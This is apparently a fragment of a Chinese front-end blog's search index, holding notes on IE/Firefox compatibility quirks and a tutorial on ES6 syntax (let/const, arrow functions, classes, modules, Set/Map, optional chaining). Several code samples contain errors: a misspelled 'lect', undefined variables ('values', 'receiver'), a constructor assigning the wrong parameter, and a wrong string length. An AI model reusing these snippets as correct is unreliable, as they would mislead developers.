兼容firefox，firefox不能下载跨域资源</span></span><br><span class="line">  a.click()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="14-IE-new-Date-出现NaN"><a href="#14-IE-new-Date-出现NaN" class="headerlink" title="14. IE new Date()出现NaN"></a>14. IE new Date()出现NaN</h4><p><code>new Date(&quot;2014-01-01 12:11:12&quot;).getTime()</code>在IE下会返回NaN，而其他浏览器可以返回正常毫秒数。使用<code>Date.parse()</code>可解析一个日期时间字符串，并返回毫秒数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> date=<span class="string">"2014-01-01 12:11:12"</span>;  </span><br><span class="line"><span class="built_in">Date</span>.parse(date.replace(<span class="regexp">/-/g</span>,<span class="string">"/"</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="15-IE-11-缓存get请求"><a href="#15-IE-11-缓存get请求" class="headerlink" title="15. IE 11 缓存get请求"></a>15. IE 11 缓存get请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断get请求时，追加请求参数</span></span><br><span class="line"><span class="keyword">const</span> isIE = !!<span class="built_in">window</span>.ActiveXObject || <span class="string">'ActiveXObject'</span> <span class="keyword">in</span> <span class="built_in">window</span>; <span class="comment">// 判断是否IE浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isIE) &#123;</span><br><span class="line">  params = &#123; ...params, <span class="attr">t</span>: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="16-使用了text-overflow-ellipsis"><a href="#16-使用了text-overflow-ellipsis" class="headerlink" title="16. 使用了text-overflow: ellipsis"></a>16. 使用了text-overflow: ellipsis</h4><p>element UI table 的 <code>show-overflow-tooltip</code>当隐藏的字段为两个字符长度时，字段超出隐藏了，但是hover无法显示tooltip。scrollWidth和offsetWidth，在chrome, firefox, ie中表现不一样。<br><a href="https://github.com/ElemeFE/element/issues/18065" target="_blank" rel="noopener">https://github.com/ElemeFE/element/issues/18065</a><br><a href="https://github.com/ElemeFE/element/issues/5049" target="_blank" rel="noopener">https://github.com/ElemeFE/element/issues/5049</a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/dodocie/p/7137314.html" target="_blank" rel="noopener">Flex 布局在IE浏览器下的糟糕表现</a></li><li><a href="https://blog.csdn.net/kimbing/article/details/52876953" target="_blank" rel="noopener">Safari中input textarea去除阴影</a></li><li><a href="https://www.jb51.net/article/147431.htm" target="_blank" rel="noopener">纯javascript前端实现base64图片下载(兼容IE10+)</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ES6语法</title>
      <link href="/2018/10/15/ES6/"/>
      <url>/2018/10/15/ES6/</url>
      <content type="html"><![CDATA[<h3 id="1-let-const，块级作用域"><a href="#1-let-const，块级作用域" class="headerlink" title="1. let, const，块级作用域"></a>1. let, const，块级作用域</h3><ul><li><em>块级作用域</em><br>声明在指定块的作用域之外无法访问的变量。存在于函数内部和块<code>{}</code>中。一旦执行到块外会立即销毁。<br>（为什么需要块级作用域？1. 避免内层变量覆盖外层变量；2.避免用于计数的循环变量泄露为全局变量）</li></ul><ul><li><p>var<br>其作用域为该语句所在的函数内，且存在变量提升现象</p></li><li><p>let<br>其作用域为该语句所在的代码块内，不存在变量提升；<br>暂时性死区：只要块级作用于内存在<code>let</code>，就不再受外部环境影响</p></li><li><p>const<br>在后面出现的代码中不能再修改该常量的值。<br>需要注意的是，const 里面只存了一个值，可以是一个地址(object)，也可以是一个值(string/number/..)。当 const 定义的是地址的时候，我们可以修改实际指向的 object 的内容，但是不可以修改这个指向地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;;</span><br><span class="line">obj.a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj); <span class="comment">// &#123; a: 2 &#125;</span></span><br><span class="line">obj = &#123; <span class="attr">a</span>: <span class="number">2</span> &#125;; <span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-模板字面量"><a href="#2-模板字面量" class="headerlink" title="2. 模板字面量(``)"></a>2. 模板字面量(``)</h3><p>实现了多行字符串，将变量的值嵌入字符串，HTML 转义(向 HTML 插入经过安全转换后的字符串)的能力</p><ul><li>在反撇号中所有空白符都属于字符串的一部分.你可以显示地使用<code>\n</code>来指明换行。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">`hello</span></span><br><span class="line"><span class="string">  world`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.length); <span class="comment">// 16</span></span><br></pre></td></tr></table></figure><ul><li>占位符<code>${}</code> 中可以包含 Javascript 表达式</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">`hello, <span class="subst">$&#123;count&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">`hello, <span class="subst">$&#123;(count * <span class="number">2</span>).toFixed(<span class="number">2</span>)&#125;</span>`</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h3><ul><li>为形参提供默认值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">num = getValue(</span>), <span class="title">timeout</span> = 2000, <span class="title">callback</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;&#125;) &#123;&#125;</span><br><span class="line">a(<span class="number">20</span>, <span class="literal">null</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line">&#125;); <span class="comment">// 不使用默认值</span></span><br></pre></td></tr></table></figure><ul><li>默认参数的临时死区</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">first, second = getValue(first</span>)) </span>&#123;</span><br><span class="line">  <span class="comment">// 执行add()时，相当于执行以下代码来创建first和second参数值</span></span><br><span class="line">  <span class="comment">// let first = 1;</span></span><br><span class="line">  <span class="comment">// let second = getValue(1)</span></span><br><span class="line">  <span class="keyword">return</span> first + second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>); <span class="comment">// 7</span></span><br></pre></td></tr></table></figure><h4 id="3-1-不定参数-…"><a href="#3-1-不定参数-…" class="headerlink" title="3.1 不定参数(…)"></a>3.1 不定参数(…)</h4><p>不定参数可以让你指定多个独立的参数，通过整合后的数组来访问。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkArgs</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(args.length); <span class="comment">// 2</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.length); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line">checkArgs(<span class="string">'a'</span>, <span class="string">'b'</span>);</span><br><span class="line"><span class="comment">// 使用限制：每个函数只能声明一个不定参数，且一定要放在所有参数的末尾</span></span><br></pre></td></tr></table></figure><h4 id="3-2-展开运算符-…"><a href="#3-2-展开运算符-…" class="headerlink" title="3.2 展开运算符(…)"></a>3.2 展开运算符(…)</h4><p>使用…的条件是可枚举（）<br>展开运算符可以让你指定一个数组，将它们打散后作为独立的参数传入函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max(...values));</span><br><span class="line"><span class="comment">// 等价于console.log(Math.max(1,2,3,4))</span></span><br></pre></td></tr></table></figure><h4 id="3-3-箭头函数-gt"><a href="#3-3-箭头函数-gt" class="headerlink" title="3.3 箭头函数(=&gt;)"></a>3.3 箭头函数(=&gt;)</h4><p>箭头函数是一种使用箭头(=&gt;)定义函数的新语法</p><ul><li>箭头函数中的<code>this, super, arguments, new.target</code>的值由外围最近一层非箭头函数决定</li><li>箭头函数不能被用作构造函数，不能通过<code>new</code>调用</li><li>没有原型，不存在<code>prototype</code>这个属性</li><li>函数内部的<code>this</code>值不可被改变</li><li>不支持<code>arguments</code>对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="params">()</span> =&gt;</span> <span class="string">'Nicholas'</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">lect c = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> d = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">'Temp'</span>&#125;) <span class="comment">// 让箭头向外返回一个对象，应包裹在小括号里</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-对象"><a href="#4-对象" class="headerlink" title="4. 对象"></a>4. 对象</h3><h4 id="4-1-简写、可计算的属性名"><a href="#4-1-简写、可计算的属性名" class="headerlink" title="4.1 简写、可计算的属性名"></a>4.1 简写、可计算的属性名</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> suffix = <span class="string">'name'</span>;</span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name,</span><br><span class="line">  [<span class="string">'first'</span> + suffix]: <span class="string">'Zakas'</span>,</span><br><span class="line">  sayName() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="4-2-Object-assign"><a href="#4-2-Object-assign" class="headerlink" title="4.2 Object.assign"></a>4.2 Object.assign</h4><p>接受任意数量的源对象，并按指定的顺序将属性复制到接收对象中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(&#123;&#125;, &#123; <span class="attr">type</span>: <span class="string">'js'</span>, <span class="attr">name</span>: <span class="string">'file.js'</span> &#125;, &#123; <span class="attr">type</span>: <span class="string">'css'</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(receiver.type); <span class="comment">// 'css'</span></span><br></pre></td></tr></table></figure><h4 id="4-3-super"><a href="#4-3-super" class="headerlink" title="4.3 super"></a>4.3 super</h4><p>简化原型访问的<code>super</code>引用，指向对象原型的指针，实际是<code>Object.getPrototypeOf(this)</code>的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  getGreeting() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello '</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> friend = &#123;</span><br><span class="line">  getGreeting() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.getGreeting() + <span class="string">'friend'</span>;</span><br><span class="line">  &#125; <span class="comment">// hello friend</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-解构赋值"><a href="#5-解构赋值" class="headerlink" title="5. 解构赋值"></a>5. 解构赋值</h3><p>这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。</p><ul><li><p>对象解构</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123; <span class="attr">type</span>: <span class="string">'Identifier'</span>, <span class="attr">name</span>: <span class="string">'foo'</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name &#125; = node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为非同名局部变量赋值</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">type</span>: localType, <span class="attr">name</span>: localName &#125; = node;</span><br><span class="line"><span class="built_in">console</span>.log(localType); <span class="comment">// 'Identifier'</span></span><br></pre></td></tr></table></figure></li><li><p>数组解构</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, secondColor] = colors;</span><br><span class="line"><span class="built_in">console</span>.log(firstColor); <span class="comment">// "red"</span></span><br></pre></td></tr></table></figure></li><li><p>字符串解构<br>事实上，只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, c, d, e] = <span class="string">'hello'</span>;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-类"><a href="#6-类" class="headerlink" title="6. 类"></a>6. 类</h3><p>ES6 使用<code>class</code>，取代需要<code>prototype</code>的操作。</p><h4 id="6-1-constructor"><a href="#6-1-constructor" class="headerlink" title="6.1 constructor()"></a>6.1 constructor()</h4><p>用<code>constructor</code>方法名来定义构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(length, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">  getArea() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.length * <span class="keyword">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-2-super"><a href="#6-2-super" class="headerlink" title="6.2 super()"></a>6.2 super()</h4><p><code>super()</code>方法可访问基类的构造函数。ES6 要求，子类的构造函数必须执行依次 super 函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(length) &#123;</span><br><span class="line">    <span class="keyword">super</span>(length, length);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> square = <span class="keyword">new</span> Square(<span class="number">3</span>);</span><br><span class="line"><span class="built_in">console</span>.log(square.getArea()); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-模块"><a href="#7-模块" class="headerlink" title="7. 模块"></a>7. 模块</h3><p>模块是一种打包和封装功能的方式，模块的行为与脚本不同，模块不会将它的顶级变量、函数和类修改为全局作用域，而且<code>this</code>的值为<code>undefined</code>。</p><h4 id="7-1-export"><a href="#7-1-export" class="headerlink" title="7.1 export"></a>7.1 export</h4><p>将一部分已发布的代码暴露给其他模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> color = <span class="string">'red'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 * num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出默认值</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> multiply;</span><br></pre></td></tr></table></figure><h4 id="7-2-import"><a href="#7-2-import" class="headerlink" title="7.2 import"></a>7.2 import</h4><p>从模块中导出的功能可以通过<code>import</code>关键字在另一个模块中访问</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; identifier1, identifier2 &#125; <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> example <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span><br></pre></td></tr></table></figure><h4 id="7-3-加载模块"><a href="#7-3-加载模块" class="headerlink" title="7.3 加载模块"></a>7.3 加载模块</h4><p>通过<code>&lt;script type=&quot;module&quot;&gt;</code>加载的模块文件默认具有 defer 属性，在文档完全被解析后，模块按照它们在文档中出现的顺序依次执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"module.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; sum &#125; <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> result = sum(<span class="number">1</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="8-Set-WeakSet-Map-WeakMap，"><a href="#8-Set-WeakSet-Map-WeakMap，" class="headerlink" title="8. Set, WeakSet, Map, WeakMap，{}"></a>8. Set, WeakSet, Map, WeakMap，{}</h3><h4 id="8-1-Set-过滤重复值"><a href="#8-1-Set-过滤重复值" class="headerlink" title="8.1 Set 过滤重复值"></a>8.1 Set 过滤重复值</h4><p>对一个数组，进行复制并创建一个无重复元素的新数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">array = [...set];</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h4 id="8-2-Map-和-的区别"><a href="#8-2-Map-和-的区别" class="headerlink" title="8.2 Map 和 {} 的区别"></a>8.2 Map 和 {} 的区别</h4><p><code>{}</code>的key只能是基本类型，Map的key可以是</p><h4 id="8-3-的key是如何排序的？"><a href="#8-3-的key是如何排序的？" class="headerlink" title="8.3 {} 的key是如何排序的？"></a>8.3 {} 的key是如何排序的？</h4><p>数字属性被最先打印出来，且是按照数字大小的顺序打印；字符串属性是按照设置顺序打印的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">100</span>] = <span class="string">'test-100'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="string">'test-1'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"B"</span>] = <span class="string">'bar-B'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">50</span>] = <span class="string">'test-50'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] =  <span class="string">'test-9'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="string">'test-8'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="string">'test-3'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="string">'test-5'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"A"</span>] = <span class="string">'bar-A'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"C"</span>] = <span class="string">'bar-C'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> Foo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> bar)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`index:<span class="subst">$&#123;key&#125;</span>  value:<span class="subst">$&#123;bar[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">index:1  value:test-1</span></span><br><span class="line"><span class="comment">index:3  value:test-3</span></span><br><span class="line"><span class="comment">index:5  value:test-5</span></span><br><span class="line"><span class="comment">index:8  value:test-8</span></span><br><span class="line"><span class="comment">index:9  value:test-9</span></span><br><span class="line"><span class="comment">index:50  value:test-50</span></span><br><span class="line"><span class="comment">index:100  value:test-100</span></span><br><span class="line"><span class="comment">index:B  value:bar-B</span></span><br><span class="line"><span class="comment">index:A  value:bar-A</span></span><br><span class="line"><span class="comment">index:C  value:bar-C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>之所以出现这样的结果，是因为在 ECMAScript 规范中定义了<strong>数字属性</strong>应该按照索引值大小升序排列，<strong>字符串属性</strong>根据创建时的顺序升序排列。</p><p>在 V8 内部，为了有效地提升存储和访问这两种属性的性能，分别使用了两个线性数据结构来分别保存<strong>数字属性 element</strong>和<strong>字符串属性 properties</strong>。</p><h3 id="9-Promise"><a href="#9-Promise" class="headerlink" title="9. Promise"></a>9. Promise</h3><h3 id="10-ES8"><a href="#10-ES8" class="headerlink" title="10. ES8"></a>10. ES8</h3><h4 id="10-1-async-await"><a href="#10-1-async-await" class="headerlink" title="10.1 async/await"></a>10.1 async/await</h4><h4 id="10-2-Object-values-Object-entries"><a href="#10-2-Object-values-Object-entries" class="headerlink" title="10.2 Object.values() / Object.entries()"></a>10.2 Object.values() / Object.entries()</h4><h4 id="10-3-Promise-finally"><a href="#10-3-Promise-finally" class="headerlink" title="10.3 Promise.finally"></a>10.3 Promise.finally</h4><p><br></p><h3 id="11-ES2020"><a href="#11-ES2020" class="headerlink" title="11. ES2020"></a>11. ES2020</h3><h4 id="11-1"><a href="#11-1" class="headerlink" title="11.1 ?. ??"></a>11.1 ?. ??</h4><ul><li><p><em><code>?.</code></em><br>可选链操作符<br>当访问对象属性时，如果中间有null或undefined，会短路返回undefined，不会继续往下走，也不会抛出错误。<br>例如，<code>user?.profile?.name</code>，如果user为null或undefined，整个表达式返回undefined，不会继续访问<code>profile</code>。</p></li><li><p><em><code>??</code></em><br>左侧是null或undefined时才返回右侧的值<br><code>const name = user.name ?? &#39;Guest&#39;;</code>，如果user.name不存在或为null/undefined</p></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《深入理解ES6》NICHOLAS C.ZAKAS</li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">《ECMAScript6入门》 阮一峰</a></li><li><a href="https://juejin.im/entry/579f5d1b1532bc00608caa9c" target="_blank" rel="noopener">ES6手册</a></li><li><a href="https://www.jianshu.com/p/a680cc4e246d" target="_blank" rel="noopener">ES6语法</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DOM 如何生成？提供了哪些API？</title>
      <link href="/2018/10/07/DOM/"/>
      <url>/2018/10/07/DOM/</url>
